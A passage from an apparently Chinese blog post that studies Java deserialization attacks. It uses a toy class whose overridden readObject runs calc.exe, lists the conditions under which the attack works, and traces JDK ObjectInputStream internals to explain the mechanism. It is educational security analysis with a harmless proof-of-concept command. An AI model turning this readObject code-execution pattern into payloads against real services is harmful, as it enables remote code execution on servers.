class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修改以上user类执行，会弹出计算器。可见执行的readObject是我们写入的readObject。</p><h3 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h3><p>那么先来回顾以下，我们以上的代码做了以下事情：</p><ol><li>自己写了一个可覆盖readObject函数的user类</li><li>创建了一个user类的实例</li><li>对之进行序列化，并存入str（这就是我们的payload）</li><li>再从str中反序列化恢复成user类，并输出了user类中的name</li></ol><p>那么问题来了，<strong>在反序列化的时候，是不是一定要代码中定义了user这个类才会执行我们的payload中的恶意readObject函数呢</strong>？<br>因为实际上服务器一般不可能存在一个我们用于复写恶意代码的类，如果必须存在user这个可复写的恶意类，我们的攻击通常不会起作用。</p><h4 id="那么试验下"><a href="#那么试验下" class="headerlink" title="那么试验下"></a>那么试验下</h4><p>我们做以下实验：</p><ol><li>用之前的代码写入paylaod到一个文件</li><li>在另一个没有user这个类的main函数中中直接读取这个文件内容并进行反序列化。</li><li>全部注释原来java文件中的user这个类（重要）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test_user_class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//序列化写入文件</span></span><br><span class="line">        FileInputStream f = <span class="keyword">new</span> FileInputStream(<span class="string">"test.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(f);</span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g69pw7duosj310k147tcf.jpg" alt><br>执行代码发生报错：找不到user这个类</p><ol start="4"><li>注释user类的所有接口，只留下user这个类的空壳</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g69pvzrlthj325d0v3tbu.jpg" alt><br>class接口错误</p><ol start="5"><li>只注释user类中的复写readObject函数</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g69pvqi8arj30y60o5ab9.jpg" alt><br>未报错，但是未执行calc.exe</p><ol start="6"><li>不注释user类</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g69pv2xhd7j30xz16otff.jpg" alt><br>执行calc.exe，弹计算器成功</p><p>那么我们可知普通的java反序列化攻击必须要满足以下条件：</p><ol><li>反序列化点输入可控</li><li>使用readObject函数执行反序列化</li><li>当前class空间中存在一个可复写readObject的类</li><li>由于未知的可序列化的readObject类不一定会允许任意代码执行，我们还需要根据当前环境再这个复写readObject类中进一步构筑可利用链（示例代码用的user类简化了这一步骤，实际利用链不在这篇讨论范围内，并且现在的我也不会哈哈）</li></ol><p>通常的攻击流程就是：</p><ol><li>先通过目标服务器中可复写的readObject类来构建可任意代码执行的序列化payload</li><li>再通过可控输入点输入payload，执行readObject()函数，从而执行复写的readObject函数，再通过可利用链形成任意代码执行<br>（笼统来说是这样的嗷）</li></ol><h3 id="第二个问题"><a href="#第二个问题" class="headerlink" title="第二个问题"></a>第二个问题</h3><p>我们重新回头看这个我们写的这个user类的readObject函数：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处存在两个注意点：</p><ol><li>readObject函数必须是<code>private</code>属性</li><li>readObject函数必须传参<code>java.io.ObjectInputStream in</code></li></ol><p>那么问题来了，<strong>到底为什么readObject函数要使用private属性，传参java.io.ObjectInputStream呢</strong>?</p><h4 id="那么深究一下为啥呢"><a href="#那么深究一下为啥呢" class="headerlink" title="那么深究一下为啥呢"></a>那么深究一下为啥呢</h4><p>先在<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code>处下断点，运行。<br>得到如下调用栈</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g666z9wj85j31qa11btd1.jpg" alt></p><p>根据调用栈的层次来回溯是如何执行到<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code><br>先是<code>ObjectInputStream.java</code>的<code>readObject</code>函数</p><blockquote><p>idea正向调试时，有些函数需要强制进入，虽然在调用最末端下断点是不需要的，这里简单提一下</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">           <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// if nested read, passHandle contains handle of enclosing object</span></span><br><span class="line">       <span class="keyword">int</span> outerHandle = passHandle;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//进入这里，默认传入false</span></span><br><span class="line">           Object obj = readObject0(<span class="keyword">false</span>);</span><br><span class="line">           handles.markDependency(outerHandle, passHandle);</span><br></pre></td></tr></table></figure><blockquote><p>一开始我还以为是如果覆盖了enableOverride为true，直接通过readObjectOverride去调用我们的函数。实际上….完全不是= =</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">private</span> Object <span class="title">readObject0</span><span class="params">(<span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// ...省略...</span></span><br><span class="line">        <span class="keyword">byte</span> tc;</span><br><span class="line">        <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123; <span class="comment">//此处bin.peekByte()赋值为115，TC_RESET为121。等式不成立。由于自己太菜，不细究为什么115这些底层细节</span></span><br><span class="line">            bin.readByte();</span><br><span class="line">            handleReset();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (tc) &#123;<span class="comment">//此时tc是115</span></span><br><span class="line"><span class="comment">// ...省略...</span></span><br><span class="line">                <span class="keyword">case</span> TC_OBJECT:<span class="comment">//TC_OBJECT为115，感觉可能是反序列化的目标是一个Object的意思？</span></span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));<span class="comment">//先进入readOrdinaryObject函数，后进入checkResolve函数</span></span><br></pre></td></tr></table></figure><p>先执行readOrdinaryObject函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="comment">//省略一个抛出异常，没看懂</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    ObjectStreamClass desc </span>= readClassDesc(<span class="keyword">false</span>);<span class="comment">//此处会形成一个user类的ObjectStreamClass类</span></span><br><span class="line">    desc.checkDeserialize();<span class="comment">//检查是否反序列化？</span></span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();<span class="comment">//获取class user</span></span><br><span class="line">    <span class="keyword">if</span> (cl == String.class || cl == Class.class</span><br><span class="line">            || cl == ObjectStreamClass.class) &#123;<span class="comment">//一些类型不提供支持，报错</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"invalid class descriptor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = desc.isInstantiable() ? desc.newInstance() : <span class="keyword">null</span>;<span class="comment">//很关键 先判断是否有构造器，然后获取class user的实例化obj</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            desc.forClass().getName(),</span><br><span class="line">            <span class="string">"unable to create instance"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//以下没搞懂，做一些判断</span></span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line">    ClassNotFoundException resolveEx = desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handles.markException(passHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable()) &#123;<span class="comment">//进行一次判断，如果序列化的接口是Externalizable类型，就进入readExternalData，否则进入readSerialData</span></span><br><span class="line">        readExternalData((Externalizable) obj, desc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        readSerialData(obj, desc);<span class="comment">//我们进入这个readSerialData函数</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>Externalizable类型的反序列化类型，可以通过writeExternal()和readExternal()方法指定一个类的部分数据进行序列化与反序列化。<br>Serializable接口也可以实现类似的机制：将不想要序列化的部分添加一个关键字：transient（临时的）。它声明的变量实行序列化操作的时候不会写入到序列化文件中去。</p></blockquote><p>继续readSerialData()，这里我们传入了class user的实例obj，以及class user的ObjectStreamClass类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">   ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;<span class="comment">//这边好像是在做遍历需要反序列化的数据</span></span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) &#123;<span class="comment">//判断是否有数据</span></span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="keyword">null</span> || handles.lookupException(passHandle) != <span class="keyword">null</span>) &#123;<span class="comment">//做一些不知都是什么的意外判断，总之我们进入了else</span></span><br><span class="line">                defaultReadFields(<span class="keyword">null</span>, slotDesc); <span class="comment">// skip field values</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;<span class="comment">//很关键，判定我们反序列化的当前class是否存在ReadObject函数，结果为真</span></span><br><span class="line">                <span class="comment">//接下来就没看懂在干啥了..好像是在获取上下文？</span></span><br><span class="line">                ThreadDeath t = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">boolean</span> reset = <span class="keyword">false</span>;</span><br><span class="line">                SerialCallbackContext oldContext = curContext;</span><br><span class="line">                <span class="keyword">if</span> (oldContext != <span class="keyword">null</span>)</span><br><span class="line">                    oldContext.check();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="keyword">this</span>);<span class="comment">//进入了这个函数，</span></span><br><span class="line">                    ....</span><br></pre></td></tr></table></figure><p><code>slotDesc.invokeReadObject(obj, this);</code></p><ul><li>slotDesc是我们反序列化的class user的ObjectStreamClass类</li><li>obj是class user的实例化</li><li>this就是<code>ObjectInputStream in</code>一类</li></ul><p>继续 invokeReadObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">invokeReadObject</span><span class="params">(Object obj, ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> ClassNotFoundException, IOException,</span></span><br><span class="line"><span class="function">              UnsupportedOperationException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       requireInitialized();</span><br><span class="line">       <span class="keyword">if</span> (readObjectMethod != <span class="keyword">null</span>) &#123;<span class="comment">//判断是否有readObjectMethod函数</span></span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               readObjectMethod.invoke(obj, <span class="keyword">new</span> Object[]&#123; in &#125;);<span class="comment">//调用了这个函数，并传入了一个ObjectInputStream的Object列表</span></span><br><span class="line">           &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">               Throwable th = ex.getTargetException();</span><br><span class="line">               <span class="keyword">if</span> (th <span class="keyword">instanceof</span> ClassNotFoundException) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> (ClassNotFoundException) th;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (th <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> (IOException) th;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="comment">// 省略...</span></span><br></pre></td></tr></table></figure><blockquote><p>一开始不是理解透彻反射机制，出了java反射机制一文学习了之后回来继续</p></blockquote><p><code>readObjectMethod.invoke(obj, new Object[]{ in })</code> 其实就是一处反射机制的使用：</p><ul><li><code>readObjectMethod</code> 是 Method类型，和反射中getMethod返回的结果一样</li><li><code>readObjectMethod.invoke</code>，调用Method类型的invoke方法，传输进入参数去调用该readObjectMethod函数，也就是我们复写的readObject函数</li><li>那么invoke方法需要传入的参数是：<ul><li>一个之前生成的class user的实例obj</li><li>之前传入的ObjectInputStream类型，用new Object[]进行封装（因为<code>invoke()</code>函数接受<code>Object... args</code>作为参数，需要加一层封装保证原始数据，具体参考java反射机制一文）</li></ul></li></ul><p>那么这里就使用反射机制完成了我们写入的readObject函数的调用。<br>但是我们依旧没有解决为什么我们的user类中复写的readObject函数要使用private属性，传参java.io.ObjectInputStream呢？</p><p>我们需要一个对照组</p><h4 id="不能复写成功的对照组"><a href="#不能复写成功的对照组" class="headerlink" title="不能复写成功的对照组"></a>不能复写成功的对照组</h4><p>对照组user class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//修改以下readObject类 private 为 public</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>先根据对比结果，总结之前的调用栈，做一个总的对比，然后细说<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.ReadObject() </span><br><span class="line">-&gt; readObject0() </span><br><span class="line">-&gt; readOrdinaryObject() </span><br><span class="line">-&gt; readSerialData() ===对照组发生分支==&gt; defaultReadFields(obj, slotDesc);</span><br><span class="line">--复写组的调用路径--&gt; invokeReadObject() </span><br><span class="line">-&gt; (反射机制调用)readObjectMethod.invoke(obj, <span class="keyword">new</span> Object[]&#123; in &#125;);</span><br></pre></td></tr></table></figure></p><p>两组的调用栈前面都是一致的，在<code>readSerialData()</code>中发生了判断分支：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">   ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;<span class="comment">//这边好像是在做遍历需要反序列化的数据</span></span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) &#123;<span class="comment">//判断是否有数据</span></span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="keyword">null</span> || handles.lookupException(passHandle) != <span class="keyword">null</span>) &#123;<span class="comment">//做一些不知都是什么的意外判断，总之我们进入了else</span></span><br><span class="line">                defaultReadFields(<span class="keyword">null</span>, slotDesc); <span class="comment">// skip field values</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;<span class="comment">//世界线变动之处，判定我们反序列化的当前class是否存在ReadObject函数，对照组的结果为假</span></span><br><span class="line">                ThreadDeath t = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">boolean</span> reset = <span class="keyword">false</span>;</span><br><span class="line">                SerialCallbackContext oldContext = curContext;</span><br><span class="line">                <span class="keyword">if</span> (oldContext != <span class="keyword">null</span>)</span><br><span class="line">                    oldContext.check();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="keyword">this</span>);<span class="comment">//复写成功的情况，进入了这个函数，</span></span><br><span class="line">                    ....</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                defaultReadFields(obj, slotDesc);<span class="comment">//复写失败的对照组，进入了这个函数，最后调用了本身的readObject</span></span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure></p><p>那么我们可以知道，readObject的复写成功与否与<code>slotDesc.hasReadObjectMethod()</code>紧密相关，</p><p>slotDesc其实就是我们反序列化的class，而hasReadObjectMethod()其实就是判断这个反序列化class的ObjectInputStream类中的readObjectMethod参数是否为空。</p><p>那么readObjectMethod其实就是在生成ObjectInputStream类的时候就定义好了，到底是怎么生成的呢？我们需要去ObjectInputStream的构造函数中寻找答案<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">ObjectStreamClass</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.cl = cl;</span><br><span class="line">    name = cl.getName();</span><br><span class="line">    isProxy = Proxy.isProxyClass(cl);</span><br><span class="line">    isEnum = Enum.class.isAssignableFrom(cl);</span><br><span class="line">    serializable = Serializable.class.isAssignableFrom(cl);</span><br><span class="line">    externalizable = Externalizable.class.isAssignableFrom(cl);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; superCl = cl.getSuperclass();</span><br><span class="line">    superDesc = (superCl != <span class="keyword">null</span>) ? lookup(superCl, <span class="keyword">false</span>) : <span class="keyword">null</span>;</span><br><span class="line">    localDesc = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (serializable) &#123;<span class="comment">//查看是否可反序列化</span></span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (isEnum) &#123;</span><br><span class="line">                    suid = Long.valueOf(<span class="number">0</span>);</span><br><span class="line">                    fields = NO_FIELDS;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">                    fields = NO_FIELDS;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                suid = getDeclaredSUID(cl);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fields = getSerialFields(cl);</span><br><span class="line">                    computeFieldOffsets();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvalidClassException e) &#123;</span><br><span class="line">                    serializeEx = deserializeEx =</span><br><span class="line">                        <span class="keyword">new</span> ExceptionInfo(e.classname, e.getMessage());</span><br><span class="line">                    fields = NO_FIELDS;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (externalizable) &#123;<span class="comment">//是否Externalizable类型反序列化，为false</span></span><br><span class="line">                    cons = getExternalizableConstructor(cl);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//开始解析该类，并填充ObjectStreamClass类的常量，包括我们关注的readObjectMethod</span></span><br><span class="line">                    cons = getSerializableConstructor(cl);</span><br><span class="line">                    writeObjectMethod = getPrivateMethod(cl, <span class="string">"writeObject"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectOutputStream.class &#125;,</span><br><span class="line">                        Void.TYPE);</span><br><span class="line">                    readObjectMethod = getPrivateMethod(cl, <span class="string">"readObject"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectInputStream.class &#125;,</span><br><span class="line">                        Void.TYPE);<span class="comment">//赋值readObjectMethod</span></span><br></pre></td></tr></table></figure></p><p>查看<code>getPrivateMethod()</code>函数,我们传入了以下参数:</p><ul><li>cl：class user类</li><li>name：readObject字符串</li><li>argTypes：ObjectInputStream.class 的Class列表封装</li><li>returnType：void类型</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns non-static private method with given signature defined by given</span></span><br><span class="line"><span class="comment"> * class, or null if none found.  Access checks are disabled on the</span></span><br><span class="line"><span class="comment"> * returned method (if any).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span 